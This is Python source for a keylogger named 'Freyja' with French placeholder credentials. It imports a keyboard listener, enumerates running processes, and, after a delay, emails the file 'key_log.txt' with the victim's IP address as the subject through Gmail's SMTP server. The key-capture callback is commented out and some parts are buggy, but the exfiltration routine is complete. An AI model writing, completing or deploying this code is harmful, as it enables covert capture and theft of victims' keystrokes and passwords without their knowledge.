# Freyja v1.0.0.0

from pynput.keyboard import Key, Listener
import logging
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os
import socket
import datetime
import sys
from subprocess import Popen, PIPE, check_output
import subprocess
import time
import simplejson
import logging
import re


log_dir = ""

tasklist = os.system("tasklist")
def get_processes_running():
    tasks = check_output(['tasklist']).decode('cp866', 'ignore').split("\r\n")
    p = []
    for task in tasks:
        m = re.match(b'(.*?)\\s+(\\d+)\\s+(\\w+)\\s+(\\w+)\\s+(.*?)\\s.*', task.encode())
        if m is not None:
            p.append({"image":m.group(1).decode(),
                        "pid":int(m.group(2).decode()),
                        "session_name":m.group(3).decode(),
                        "session_num":int(m.group(4).decode()),
                        "mem_usage":int(m.group(5).decode('ascii', 'ignore'))
                        })
    return( p)

def test():
    with open("output.txt", 'w') as f:
        print(*[line.decode('cp866', 'ignore') for line in Popen('tasklist', stdout=PIPE).stdout.readlines()])

if __name__ == '__main__':
    test()

#def on_press(key):
#    logging.info(str(key))
#    if key == Key.esc:
#        return False

time.sleep(10)


myip = socket.gethostbyname(socket.gethostname())
email_user = 'Votre E-mail'
email_send = 'Votre E-mail'
email_password = 'Votre Mot de Passe'
subject = 'Keylogger', myip

msg = MIMEMultipart()
msg['From'] = email_user
msg['To'] = email_send
msg['Subject'] = subject

body = 'Python Keylogger réponse.'
msg.attach(MIMEText(body, 'plain'))

filename='key_log.txt'
attachment =open(filename, 'rb')

part = MIMEBase('application', 'octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', "attachment; filename= "+filename)

msg.attach(part)
text = msg.as_string()
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(email_user, email_password)

server.sendmail(email_user,email_send,text)
server.quit()
